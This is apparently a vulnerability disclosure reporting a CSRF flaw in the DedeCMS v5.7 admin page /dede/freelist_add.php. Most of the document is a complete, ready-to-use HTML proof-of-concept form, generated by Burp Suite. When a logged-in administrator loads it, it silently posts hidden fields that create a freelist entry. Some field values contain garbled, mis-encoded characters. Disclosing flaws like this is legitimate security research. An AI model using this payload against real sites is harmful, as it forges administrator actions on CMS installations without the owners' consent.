target:https://github.com/wdsunwq/DedeCMSv5
version: v5.7

DedeCMS v5.7 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component /dede/freelist_add.php
![1](https://github.com/777erp/cms/assets/113673221/40b87ac6-b4e1-4074-92dc-0fd25bbbf2cc)


Poc:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1/src/dede/freelist_add.php" method="POST">
      <input type="hidden" name="dopost" value="save" />
      <input type="hidden" name="title" value="cs" />
      <input type="hidden" name="listdir" value="&#123;cmspath&#125;&#47;freelist&#47;" />
      <input type="hidden" name="defaultpage" value="index&#46;html" />
      <input type="hidden" name="namerule" value="&#123;listdir&#125;&#47;index&#95;&#123;listid&#125;&#95;&#123;page&#125;&#46;html" />
      <input type="hidden" name="templet" value="&#123;style&#125;&#47;list&#95;free&#46;htm" />
      <input type="hidden" name="maxpage" value="100" />
      <input type="hidden" name="keywords" value="" />
      <input type="hidden" name="description" value="" />
      <input type="hidden" name="liststyle" value="4" />
      <input type="hidden" name="typeid" value="0" />
      <input type="hidden" name="channel" value="0" />
      <input type="hidden" name="att" value="0" />
      <input type="hidden" name="subday" value="0" />
      <input type="hidden" name="pagesize" value="30" />
      <input type="hidden" name="col" value="1" />
      <input type="hidden" name="titlelen" value="60" />
      <input type="hidden" name="keywordarc" value="" />
      <input type="hidden" name="orderby" value="pubdate" />
      <input type="hidden" name="order" value="desc" />
      <input type="hidden" name="innertext" value="&#13;&#10;&lt;li&gt;&#13;&#10;&#32;&#32;&#32;&#91;field&#58;imglink&#47;&#93;&#13;&#10;&#32;&#32;&#32;&#32;&#91;field&#58;textlink&#47;&#93;&#13;&#10;&#32;&#32;&#32;&#32;&lt;span&#32;class&#61;&quot;info&quot;&gt;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&lt;small&gt;�&#151;&#165;�&#156;&#159;�&#188;&#154;&lt;&#47;small&gt;&#91;field&#58;pubdate&#32;function&#61;&quot;getdatemk&#40;&#64;me&#41;&quot;&#47;&#93;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&lt;small&gt;�&#130;&#185;�&#135;&#187;�&#188;&#154;&lt;&#47;small&gt;&#91;field&#58;click&#47;&#93;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&lt;small&gt;�&#165;&#189;�&#175;&#132;�&#188;&#154;&lt;&#47;small&gt;&#91;field&#58;scores&#47;&#93;&#13;&#10;&#32;&#32;&#32;&#32;&lt;&#47;span&gt;&#13;&#10;&#32;&#32;&#32;&#32;&lt;p&#32;class&#61;&quot;intro&quot;&gt;&#32;&#91;field&#58;description&#47;&#93;&#46;&#46;&#46;&lt;&#47;p&gt;&#13;&#10;&#32;&#32;&#32;&#32;&lt;&#47;li&gt;&#13;&#10;" />
      <input type="hidden" name="Submit2" value="�&#191;&#157;�&#173;&#152;�&#184;&#128;�&#184;&#136;&#151;�&#161;&#168;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>



```

![2](https://github.com/777erp/cms/assets/113673221/4c767aea-0907-4594-bbe0-61defecf5241)


Successed

![3](https://github.com/777erp/cms/assets/113673221/46cde55a-cb49-470f-87af-96b20936eff6)

